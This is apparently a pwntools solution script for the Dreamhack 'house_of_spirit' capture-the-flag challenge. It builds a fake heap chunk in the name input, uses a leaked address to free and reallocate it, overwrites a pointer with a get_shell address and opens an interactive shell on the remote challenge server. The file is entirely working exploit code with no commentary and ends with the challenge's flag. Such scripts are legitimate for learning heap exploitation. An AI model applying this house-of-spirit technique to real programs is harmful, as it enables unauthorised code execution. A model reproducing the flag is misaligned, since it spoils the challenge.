from pwn import *

# p = process("./house_of_spirit")
p = remote("host1.dreamhack.games",8500)

get_shell = 0x400940

name = ""
name += p64(0x00)
name += p64(0x41)
name += "a"*8
name += "a"*7

p.sendafter("name:",name)


recv = int(p.recvuntil(":")[:-1],16)
log.info(hex(recv))


payload = ""
payload += "a"*8
payload += "b"*8

p.sendlineafter(">",str(1))
p.sendlineafter("Size:",str(0x30))
p.sendlineafter("Data:",payload)

p.sendlineafter(">",str(2))
pause()
p.sendlineafter("Addr:",str(recv+0x10))

payload = ""
payload += "a"*8*5
payload += p64(get_shell)

p.sendlineafter(">",str(1))
p.sendlineafter("Size:",str(0x30))
p.sendlineafter("Data:",payload)

p.sendlineafter(">",str(3))

p.interactive()

#DH{d351d8d936884dc4aaebb689e8a183b2}